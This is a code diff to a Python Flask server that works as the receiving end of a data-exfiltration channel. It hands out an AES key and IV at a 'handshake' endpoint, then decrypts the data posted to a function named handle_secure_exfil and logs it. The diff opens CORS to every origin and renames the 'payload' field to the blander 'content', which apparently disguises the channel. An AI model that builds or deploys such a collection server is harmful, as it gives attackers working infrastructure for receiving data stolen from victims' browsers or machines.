@@ -3,13 +3,14 @@ import datetime
 import base64
 import secrets
 import string
+import json
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
 
 app = Flask(__name__)
-CORS(app)
+CORS(app, resources={r"/*": {"origins": "*"}})
 
 LOG_FILE = "forensic_log.txt"
 ARCHIVE_DIR = "archive"
@@ -29,32 +30,25 @@ def rotate_logs():
 
 @app.route('/v1/handshake', methods=['GET'])
 def handshake():
-    return jsonify({
-        "k": current_session_key,
-        "i": current_session_iv
-    }), 200
+    return jsonify({"k": current_session_key, "i": current_session_iv}), 200
 
 @app.route('/v1/verify', methods=['POST'])
 def handle_secure_exfil():
     data = request.json
-    ciphertext = data.get('payload', '')
-    
+    ciphertext = data.get('content', '')
     try:
         raw_cipher = base64.b64decode(ciphertext)
         key_bytes = current_session_key.encode('utf-8')
         iv_bytes = current_session_iv.encode('utf-8')
-        
         cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
         decrypted = unpad(cipher.decrypt(raw_cipher), AES.block_size).decode('utf-8')
-        
         with open(LOG_FILE, "a") as f:
             f.write(f"[{datetime.datetime.now()}] {decrypted}\n")
-        
-        print(f"\033[92m[+] DECRYPTED:\033[0m {decrypted}")
+        print(f"\033[92m[+] DECRYPTED CONTENT:\033[0m {decrypted}")
         return jsonify({"status": "success"}), 200
-    except Exception as e:
+    except Exception:
         return jsonify({"status": "error"}), 400
 
 if __name__ == '__main__':
     rotate_logs()
-    app.run(host='0.0.0.0', port=PORT)
+    app.run(host='0.0.0.0', port=PORT, debug=False)
